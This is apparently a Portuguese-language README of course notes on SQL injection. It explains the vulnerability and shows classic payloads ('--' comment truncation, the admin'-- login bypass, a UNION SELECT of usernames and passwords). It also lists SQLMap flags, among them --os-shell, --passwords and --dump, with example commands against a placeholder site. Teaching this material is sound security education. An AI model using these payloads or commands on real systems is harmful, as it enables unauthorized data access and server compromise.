# SQLinjection

Esse README apresenta ideias centrais sobre SQLinjection. Para um estudo mais aprofundado utilize os links abaixo:

➡️ [Fonte principal](https://portswigger.net/web-security/sql-injection#subverting-application-logic)  
➡️ [PDF da Aula](./pdf/sql_injection.pdf) desenvolvido por [@GJSegatto](https://github.com/GJSegatto)

---

## 📌 O que é SQL?

**SQL (Structured Query Language)** é a linguagem padrão para **gerenciar e manipular** dados em **bancos de dados relacionais**, como MySQL e PostgresSQL.  
Permite realizar operações **CRUD** (*Create, Read, Update, Delete*).

**Exemplos de consultas:**
```sql
SELECT nome, idade FROM clientes WHERE cidade = 'Araranguá';
INSERT INTO clientes (nome, idade) VALUES ('Hacker da Silva', 30);
DELETE FROM clientes WHERE nome = 'Hacker Santos';
```

## ⚠️ O que é SQL Injection?

SQL Injection (SQLi) é uma vulnerabilidade que ocorre quando entradas fornecidas por usuários não são tratadas e acabam interferindo diretamente nas consultas SQL da aplicação.

Possíveis impactos:

- Acesso a dados sensíveis
- Alteração ou exclusão de registros
- Ataques de negação de serviço (DoS)
- Comprometimento de servidores

## 🔍 Como detectar vulnerabilidades

- Inserção de aspas simples (') em campos de input
- Uso de condições booleanas ('1'='1' OR '1'='2')
- Payloads que induzem atrasos
- Ferramentas como [SQLMap](#️-sqlmap)


## 🛠️ Tipos e exemplos de SQL Injection

### 1. Recuperação de dados ocultos
```sql
-- Consulta original
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;

-- Injeção
"Gifts'--"

-- Resultado
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1;
```

### 2. Quebra da lógica de autenticação

```sql
-- Consulta original
SELECT * FROM users WHERE username = 'hacker' AND password = 'senhasegura';

-- Injeção
"admin'--"

-- Resultado
SELECT * FROM users WHERE username = 'admin'--' AND password = '';
```

### 3. Recuperar dados de outra tabela

```sql
-- Consulta original
SELECT name, description FROM products WHERE category = 'Gifts';

-- Injeção com UNION
' UNION SELECT username, password FROM users--
```

## 🖥️ SQLMap

SQLMap é uma ferramenta automatizada para exploração de SQLi que:

- Detecta múltiplos tipos de injeção
- Suporta diversos Sistemas Gerenciadores de Bancos de Dados (SGBDs)
- Enumera bancos, tabelas e colunas
- Extrai dados e abre shells no sistema

➡️ [Documentação Oficial](https://www.kali.org/tools/sqlmap/)

### 🔧 Principais flags

#### Básicas
```bash
-v                  # Verbosidade (0-6)
-u --url            # URL alvo
--data=DATA         # Dados via POST
-p                  # Parâmetros a testar
```

#### Enumeração

```bash
-a --all            # Recupera tudo
--dbs               # Lista bancos
--tables            # Lista tabelas
--columns           # Lista colunas
-D [DB]             # Banco específico
-T [TABLE]          # Tabela específica
-C [COLUMN]         # Coluna específica
--dump              # Extrai dados da tabela
```

#### Avançadas

```bash
--passwords         # Hashes de senha do DBMS
--os-shell          # Shell no sistema
--batch             # Usa valores padrão
--wizard            # Interface assistida
```

### 📌 Exemplos de Uso

```bash
sqlmap -u "http://site.com/pagina?id=1" -p id
sqlmap -u "http://site.com/pagina?id=1" --dbs
sqlmap -u "http://site.com/pagina?id=1" -D banco -T tabela --dump
sqlmap -u "http://site.com/login" --data="user=admin&pass=admin"
```